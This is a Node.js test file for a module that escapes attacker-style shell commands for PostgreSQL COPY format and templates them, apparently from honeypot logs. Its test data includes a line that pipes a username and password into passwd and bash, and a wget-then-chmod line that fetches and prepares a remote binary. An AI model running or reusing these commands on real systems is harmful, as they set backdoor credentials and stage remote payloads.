const test = require('node:test');
const assert = require('node:assert');
const { unescape, escape, transformLine } = require('../../db/backfill/template-stream');

/**
 * The backfill moves commands through PostgreSQL's COPY *text* format, and a
 * mistake in the escaping does not throw — it writes a plausible-looking but
 * wrong template for the rest of time. These are the cases that decide it.
 */

test('a literal backslash-n in the command is not turned into a newline', () => {
  // The passwd family is the whole reason this matters. The shell source
  // contains the two characters \ and n; COPY writes them as \\ then n.
  const onWire = 'echo -e "support\\\\n6ePLHArr17wr\\\\n6ePLHArr17wr"|passwd|bash';
  const decoded = unescape(onWire);
  assert.strictEqual(decoded, 'echo -e "support\\n6ePLHArr17wr\\n6ePLHArr17wr"|passwd|bash');
  assert.ok(!decoded.includes('\n'), 'must not contain a real newline');
});

test('a real newline in the command survives the round trip', () => {
  const command = 'wget http://1.2.3.4/x\nchmod +x x';
  assert.strictEqual(unescape(escape(command)), command);
  // and is still one line on the wire, which is what makes the stream
  // line-oriented in the first place.
  assert.ok(!escape(command).includes('\n'));
});

test('round trips the characters COPY escapes', () => {
  for (const s of ['a\tb', 'a\\b', 'a\\\\b', 'a\rb', 'a\bb', 'a\fb', 'a\vb',
                   'plain', '', '\\N as text', 'back\\slash\\n']) {
    assert.strictEqual(unescape(escape(s)), s, `broke on ${JSON.stringify(s)}`);
  }
});

test('escaping is not double-applied to an already-escaped backslash', () => {
  // escape() must handle backslash before the others, or \n becomes \\n.
  assert.strictEqual(escape('a\\nb'), 'a\\\\nb');
  assert.strictEqual(unescape('a\\\\nb'), 'a\\nb');
});

test('transformLine splits on the first tab only', () => {
  // A command containing a tab arrives escaped as \t, so the only real tab on
  // the line is the column separator — but the slice must not rely on there
  // being exactly one.
  const out = transformLine('42\tscp -t /tmp/V62vtXQH');
  assert.strictEqual(out, '42\tscp -t /tmp/<RAND8>');
});

test('drops the lines COPY frames with rather than templating them', () => {
  for (const line of ['', '\\.', 'no-tab-here', '7\t\\N']) {
    assert.strictEqual(transformLine(line), null, `should drop: ${JSON.stringify(line)}`);
  }
});

test('output is a single line even for a multi-line command', () => {
  const out = transformLine('9\twget http://1.2.3.4/x\\nchmod +x x');
  assert.strictEqual(out.split('\n').length, 1);
  assert.match(out, /<IP>/);
});
